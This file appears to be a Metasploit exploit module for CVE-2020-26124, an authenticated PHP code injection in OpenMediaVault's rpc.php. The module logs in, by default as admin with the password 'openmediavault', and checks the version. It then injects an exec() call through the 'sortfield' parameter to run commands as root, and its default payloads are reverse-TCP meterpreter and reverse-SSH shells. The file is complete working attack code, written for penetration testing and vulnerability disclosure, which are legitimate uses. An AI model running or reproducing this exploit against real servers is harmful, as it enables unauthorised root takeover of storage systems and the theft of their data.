##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'OpenMediaVault rpc.php Authenticated PHP Code Injection',
        'Description' => %q{
          This module exploits an authenticated PHP code injection
          vulnerability found in openmediavault before 4.1.36 and 5.x before 5.5.12
          inclusive in the "sortfield" POST parameter of "rpc.php" page,
          because json_encode_safe is not used in config/databasebackend.inc.
          Successful exploitation allows arbitrary command execution
          on the underlying operating system as root.
        },
        'Author' => [
          # Obrela Labs Team - Discovery and Metasploit module
          'Anastasios Stasinopoulos (@ancst)'
        ],
        'References' => [
          ['CVE', '2020-26124'],
          ['URL', 'https://www.openmediavault.org/?p=2797']
        ],
        'License' => MSF_LICENSE,
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],
        'Payload' => { 'BadChars' => "\x00" },
        'DisclosureDate' => 'Sep 28 2020',
        'Targets' =>
          [
            [
              'Automatic (Linux Dropper)',
              'Platform' => 'linux',
              'Arch' => [ARCH_X86, ARCH_X64],
              'DefaultOptions' => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' },
              'Type' => :linux_dropper
            ],
            [
              'Automatic (Unix In-Memory)',
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_ssh' },
              'Type' => :unix_memory
            ]
          ],
        'Privileged' => false,
        'DefaultTarget' => 0
      )
    )
    register_options(
      [
        OptString.new('HttpUsername', [ true, 'User to login with', 'admin']),
        OptString.new('HttpPassword', [ true, 'Password to login with', 'openmediavault']),
      ]
    )
  end

  def user
    datastore['HttpUsername']
  end

  def pass
    datastore['HttpPassword']
  end

  def login(user, pass, _opts = {})
    print_status("#{peer} - Authenticating with OpenMediaVault using \"#{user}:#{pass}\"...")
    @uri = normalize_uri(target_uri.path, '/rpc.php')
    res = send_request_cgi({
      'uri' => @uri,
      'method' => 'POST',
      'ctype' => 'application/json',
      'data' => {
        "service": 'Session',
        "method": 'login',
        "params": {
          "username": user.to_s,
          "password": pass.to_s
        },
        "options": nil
      }.to_json
    })
    unless res
      # We return nil here, as callers should handle this case
      # specifically with their own unique error message.
      return nil
    end

    if res.code == 200 && res.body.scan('"authenticated":true,').flatten.first && res.get_cookies.scan(/X-OPENMEDIAVAULT-SESSIONID=(\w+);*/).flatten.first
      print_good("#{peer} - Successfully authenticated with OpenMediaVault.")
      @cookie = res.get_cookies
      return res
    end
    fail_with(Failure::NoAccess, 'Failed to authenticate with OpenMediaVault.')
  rescue ::Rex::ConnectionError
    print_error('Caught a Rex::ConnectionError in login() method. Connection failed.')
    return nil
  end

  def get_target(_opts = {})
    print_status("#{peer} - Trying to detect if target is running a supported version of OpenMediaVault.")
    res = send_request_cgi({
      'uri' => @uri,
      'method' => 'POST',
      'cookie' => @cookie.to_s,
      'data' => {
        "service": 'System',
        "method": 'getInformation',
        "params": nil,
        "options": {
          "updatelastaccess": false
        }
      }.to_json
    })
    version = res.body.scan(/"version\":\"(\d.\d.{0,1}\d{0,1}.{0,1}\d{0,1})/).flatten.first
    if version.nil?
      print_error("#{peer} - Unable to grab version of OpenMediaVault installed on target!")
      return nil
    end
    print_good("#{peer} - Identified OpenMediaVault version #{version}.")
    if Gem::Version.new(version) >= (Gem::Version.new('5.5.12'))
      return nil
    end

    return version
  end

  def execute_command(cmd, _opts = {})
    send_request_cgi({
      'uri' => @uri,
      'method' => 'POST',
      'cookie' => @cookie.to_s,
      'data' => {
        "service": 'LogFile',
        "method": 'getList',
        "params": {
          "id": 'apt_history',
          "start": 0,
          "limit": 50,
          "sortfield": "'.exec(\"#{cmd}\").'",
          "sortdir": 'DESC'
        },
        "options": nil
      }.to_json
    })
  rescue ::Rex::ConnectionError
    fail_with(Failure::Unreachable, 'Connection failed.')
  end

  def check
    res = login(user, pass)
    unless res
      return CheckCode::Unknown("No response was received from #{peer} whilst in check(), check it is online and the target port is open!")
    end

    version = get_target
    if version.nil?
      # We don't print out an error message here as returning this will
      # automatically cause Metasploit to print out an appropriate error message.
      return CheckCode::Safe
    end

    delay = rand(7...15)
    cmd = "\").usleep(#{delay}0000).(\""
    print_status("#{peer} - Verifying remote code execution by attempting to execute 'usleep()'.")
    t1 = Time.now.to_i
    res = execute_command(cmd)
    t2 = Time.now.to_i
    unless res
      print_error("#{peer} - Connection failed whilst trying to perform the code injection.")
      return CheckCode::Detected
    end
    diff = t2 - t1
    if diff >= 3
      print_good("#{peer} - Response received after #{diff} seconds.")
      return CheckCode::Vulnerable
    end
    print_error("#{peer} - Response wasn't received within the expected period of time.")
    return CheckCode::Safe
  rescue ::Rex::ConnectionError
    print_error("#{peer} - Rex::ConnectionError caught in check(), could not connect to the target.")
    return CheckCode::Unknown
  end

  def exploit
    res = login(user, pass)
    unless res
      return CheckCode::Unknown("No response was received from #{peer} whilst in exploit(), check it is online and the target port is open!")
    end

    version = get_target
    if version.nil?
      # We don't print out an error message here as returning this will
      # automatically cause Metasploit to print out an appropriate error message.
      fail_with(Failure::NotVulnerable, 'Target is not vulnerable')
    end

    print_status("#{peer} - Sending payload (#{payload.encoded.length} bytes)...")
    case target['Type']
    when :unix_memory
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager(linemax: 130_000)
    end
  rescue ::Rex::ConnectionError
    print_error('Rex::ConnectionError caught in exploit(), could not connect to the target.')
    return false
  end

end
